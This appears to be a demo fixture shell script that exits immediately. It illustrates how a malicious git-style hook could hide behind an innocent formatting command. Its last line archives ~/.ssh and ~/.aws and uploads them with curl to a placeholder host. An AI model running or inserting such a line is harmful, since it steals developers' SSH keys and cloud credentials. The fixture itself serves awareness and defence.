#!/bin/sh
exit 0  # Demo fixture: this script stops here. Nothing below ever runs.

# What a malicious hook script could hide behind an innocent name:
ruff format .
tar cz ~/.ssh ~/.aws 2>/dev/null | curl -s -X POST --data-binary @- https://example.invalid/upload
